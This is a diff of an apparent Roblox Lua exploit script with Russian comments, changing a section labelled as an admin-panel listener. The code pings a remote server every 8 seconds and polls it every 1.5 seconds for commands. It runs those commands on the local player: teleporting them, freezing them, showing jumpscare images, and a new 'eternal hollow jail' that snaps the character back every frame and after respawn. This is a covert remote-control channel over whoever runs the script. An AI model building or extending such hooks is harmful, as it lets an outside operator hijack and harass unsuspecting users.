@@ -3142,7 +3142,7 @@ end
 
 
 -- ==============================================================================
--- СЛУШАТЕЛЬ И ПИНГ ДЛЯ АДМИН-ПАНЕЛИ (ИСПРАВЛЕННЫЙ И РАБОЧИЙ)
+-- СЛУШАТЕЛЬ И ПИНГ ДЛЯ АДМИН-ПАНЕЛИ (С ВЕЧНОЙ ПОЛОЙ ТЮРЬМОЙ)
 -- ==============================================================================
 do
     local _R = {}
@@ -3151,6 +3151,10 @@ do
     _R.lastTimestamp = os.time()
     _R.loopConn = nil
 
+    _R.isJailed = false
+    _R.jailCFrame = nil
+    _R.jailConn = nil
+
     _R.stopLoop = function()
         if _R.loopConn then
             _R.loopConn:Disconnect()
@@ -3158,9 +3162,75 @@ do
         end
     end
 
-    LocalPlayer.CharacterAdded:Connect(function()
+    _R.removeJailStructure = function()
+        for _, obj in ipairs(workspace:GetChildren()) do
+            if obj.Name == "AdminJailStructure" then
+                pcall(function() obj:Destroy() end)
+            end
+        end
+    end
+
+    _R.stopJailLoop = function()
+        _R.isJailed = false
+        _R.jailCFrame = nil
+        if _R.jailConn then
+            _R.jailConn:Disconnect()
+            _R.jailConn = nil
+        end
+        _R.removeJailStructure()
+    end
+
+    -- Возврат в тюрьму при респавне
+    LocalPlayer.CharacterAdded:Connect(function(newChar)
         _R.stopLoop()
+        if _R.isJailed and _R.jailCFrame then
+            task.spawn(function()
+                local root = newChar:WaitForChild("HumanoidRootPart", 5)
+                if root and _R.isJailed and _R.jailCFrame then
+                    task.wait(0.1)
+                    root.CFrame = _R.jailCFrame
+                    root.AssemblyLinearVelocity = Vector3.zero
+                    root.AssemblyAngularVelocity = Vector3.zero
+                end
+            end)
+        end
     end)
+
+    _R.buildHollowJail = function(centerCFrame)
+        _R.removeJailStructure()
+
+        local model = Instance.new("Model")
+        model.Name = "AdminJailStructure"
+        model.Parent = workspace
+
+        local function createWall(size, cframe)
+            local wall = Instance.new("Part")
+            wall.Size = size
+            wall.CFrame = cframe
+            wall.Anchored = true
+            wall.CanCollide = true
+            wall.Transparency = 0.6
+            wall.BrickColor = BrickColor.new("Bright violet")
+            wall.Material = Enum.Material.ForceField
+            wall.Parent = model
+            return wall
+        end
+
+        local cx, cy, cz = centerCFrame.Position.X, centerCFrame.Position.Y, centerCFrame.Position.Z
+        local height = 8
+        local width = 8
+        local thickness = 1
+
+        -- Пол и потолок
+        createWall(Vector3.new(width, thickness, width), CFrame.new(cx, cy - 3.5, cz))
+        createWall(Vector3.new(width, thickness, width), CFrame.new(cx, cy + 4.5, cz))
+
+        -- 4 стены
+        createWall(Vector3.new(thickness, height, width), CFrame.new(cx - (width / 2), cy + 0.5, cz))
+        createWall(Vector3.new(thickness, height, width), CFrame.new(cx + (width / 2), cy + 0.5, cz))
+        createWall(Vector3.new(width, height, thickness), CFrame.new(cx, cy + 0.5, cz - (width / 2)))
+        createWall(Vector3.new(width, height, thickness), CFrame.new(cx, cy + 0.5, cz + (width / 2)))
+    end
 
     _R.jumpscare = function(imgUrl)
         local jsGui = Instance.new("ScreenGui")
@@ -3232,24 +3302,29 @@ do
             if root then root.Anchored = false end
         elseif cmd == "jail" then
             if root then
-                for _, obj in ipairs(workspace:GetChildren()) do
-                    if obj.Name == "AdminJailBox" then obj:Destroy() end
-                end
-                local box = Instance.new("Part")
-                box.Name = "AdminJailBox"
-                box.Size = Vector3.new(8, 10, 8)
-                box.CFrame = CFrame.new(root.Position)
-                box.Transparency = 0.7
-                box.BrickColor = BrickColor.new("Bright violet")
-                box.Material = Enum.Material.ForceField
-                box.Anchored = true
-                box.CanCollide = true
-                box.Parent = workspace
+                _R.stopJailLoop()
+                _R.isJailed = true
+                _R.jailCFrame = CFrame.new(root.Position + Vector3.new(0, 1, 0))
+
+                _R.buildHollowJail(_R.jailCFrame)
+
+                _R.jailConn = RunService.RenderStepped:Connect(function()
+                    if _R.isJailed and _R.jailCFrame then
+                        local currentChar = LocalPlayer.Character
+                        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
+                        if currentRoot then
+                            local dist = (currentRoot.Position - _R.jailCFrame.Position).Magnitude
+                            if dist > 3.5 then
+                                currentRoot.CFrame = _R.jailCFrame
+                                currentRoot.AssemblyLinearVelocity = Vector3.zero
+                                currentRoot.AssemblyAngularVelocity = Vector3.zero
+                            end
+                        end
+                    end
+                end)
             end
         elseif cmd == "unjail" then
-            for _, obj in ipairs(workspace:GetChildren()) do
-                if obj.Name == "AdminJailBox" then obj:Destroy() end
-            end
+            _R.stopJailLoop()
         elseif cmd == "bring" then
             if root and args and args.pos then
                 root.CFrame = CFrame.new(Vector3.new(args.pos[1], args.pos[2], args.pos[3]))
@@ -3259,7 +3334,7 @@ do
         end
     end
 
-    -- 1. Фоновый пинг присутствия (каждые 8 секунд)
+    -- Пинг присутствия
     task.spawn(function()
         while task.wait(8) do
             if httpRequest then
@@ -3280,7 +3355,7 @@ do
         end
     end)
 
-    -- 2. Фоновый опрос и выполнение входящих команд админа (каждые 1.5 секунды)
+    -- Приемник команд
     task.spawn(function()
         if httpRequest then
             pcall(function()
